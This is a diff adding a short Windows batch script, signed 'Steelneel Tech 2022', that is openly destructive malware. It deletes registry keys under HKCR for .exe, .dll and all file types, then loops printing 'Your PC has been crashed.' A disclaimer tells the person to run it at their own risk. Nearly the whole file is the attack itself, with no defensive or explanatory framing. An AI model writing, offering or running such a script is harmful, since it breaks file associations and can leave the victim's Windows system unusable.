@@ -1,0 +1,11 @@
+@ECHO OFF
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+:MESSAGE
+ECHO Your PC has been crashed.
+GOTO MESSAGE
+
+
+:: Disclaimer we are not responsible for any harm done to your computer. Run this file at your own risk.
+:: Steelneel Tech 2022
